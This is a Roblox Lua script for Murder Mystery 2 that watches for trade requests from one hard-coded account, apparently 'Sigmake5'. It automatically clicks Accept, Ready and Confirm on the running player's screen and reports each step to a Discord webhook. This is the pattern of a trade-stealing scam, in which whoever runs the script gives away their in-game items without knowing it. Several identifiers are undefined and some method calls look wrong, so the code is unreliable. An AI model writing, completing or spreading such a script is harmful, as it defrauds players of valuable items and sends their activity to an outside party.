local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- Discord log (only sends when important events happen)
local function sendLog(msg)
    pcall(function()
        local data = HttpService:JSONEncode({content = "**MM2 Trade**\n" .. tostring(msg)})
        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
    end)
end

sendLog("Script loaded - Auto-accept active")

-- Store remotes
local StartTradeRemote = ReplicatedStorage:FindFirstChild("StartTrade")
local AcceptTradeRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
local OfferItemRemote = ReplicatedStorage:FindFirstChild("OfferItem")
local CompleteTradeRemote = ReplicatedStorage:FindFirstChild("CompleteTrade")

-- Track trade state
local tradeInProgress = false
local currentTradePartner = nil

-- Auto-click accept button
local function clickAcceptButton()
    pcall(function()
        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
            if btn:IsA("TextButton") and btn.Text == "Accept" then
                btn:Fire("MouseButton1Click")
                btn:Fire("Activated")
                sendLog("✅ Clicked Accept button")
                print("Clicked Accept button")
                return true
            end
        end
    end)
    return false
end

-- Click any button by text
local function clickButtonByText(text)
    pcall(function()
        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
            if btn:IsA("TextButton") and btn.Text and btn.Text:lower():find(text:lower()) then
                btn:Fire("MouseButton1Click")
                btn:Fire("Activated")
                sendLog("✅ Clicked: " .. btn.Text)
                return true
            end
        end
    end)
    return false
end

-- Main auto-accept flow
local function handleTradeRequest(sender)
    if tradeInProgress then 
        return 
    end
    tradeInProgress = true
    currentTradePartner = sender
    
    sendLog("🔔 Trade request from " .. sender.Name)
    print("Trade request from:", sender.Name)
    
    -- Step 1: Click Accept button
    wait(0.1)
    clickAcceptButton()
    
    -- Step 2: Wait for trade window
    wait(1)
    
    -- Step 3: Click Ready if needed
    clickButtonByText("Ready")
    clickButtonByText("Confirm")
    
    -- Step 4: Wait for Sigmake5 to accept
    wait(2)
    
    -- Step 5: Final accept
    clickAcceptButton()
    
    sendLog("🎉 Trade completed with " .. sender.Name)
    tradeInProgress = false
end

-- Listen for StartTrade remote
if StartTradeRemote and StartTradeRemote.OnClientEvent then
    StartTradeRemote.OnClientEvent:Connect(function(sender, ...)
        print("StartTrade fired from:", sender)
        if sender and sender.Name == TARGET_USER then
            handleTradeRequest(sender)
        end
    end)
end

